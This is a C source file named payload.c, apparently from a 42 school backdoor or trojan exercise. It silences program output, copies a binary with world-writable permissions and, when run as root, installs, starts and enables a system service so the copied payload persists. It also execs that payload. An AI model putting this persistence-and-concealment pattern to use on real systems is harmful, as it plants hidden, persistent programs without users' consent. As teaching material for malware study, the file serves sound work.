/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 13:27:21 by mbatty            #+#    #+#             */
/*   Updated: 2025/12/04 10:06:14 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

static int	setup_service(bool root)
{
	if (root)
	{
		int	fd;
	
		fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
		if (fd == -1)
			return (0);
	
		write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
		system(SERVICE_START);
		system(SERVICE_ENABLE);	
	}
	return (1);
}

int	export_payload(bool root, char *src_path, char *dst_path)
{
	char 	buf[4096];
	ssize_t rdb;
	int		fdin;
	int		fdout;

	printf(LOGIN_42 "\n");
	int	nullfd = open("/dev/null", O_WRONLY);
	dup2(nullfd, STDOUT_FILENO);
	dup2(nullfd, STDERR_FILENO);
	close(nullfd);

	fdin = open(src_path, O_RDONLY);
	if (fdin == -1)
		return (0);
	fdout = open(dst_path, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fdout == -1)
		return (0);

	do
	{
		rdb = read(fdin, buf, sizeof(buf));
		write(fdout, buf, rdb);
	} while (rdb > 0);

	close(fdin);
	close(fdout);
	return (setup_service(root));
}

void	exec_payload(char *payload_path, char **envp)
{
	char	*argv[] = {payload_path, NULL};
	execve(payload_path, argv, envp);
	exit(0);
}
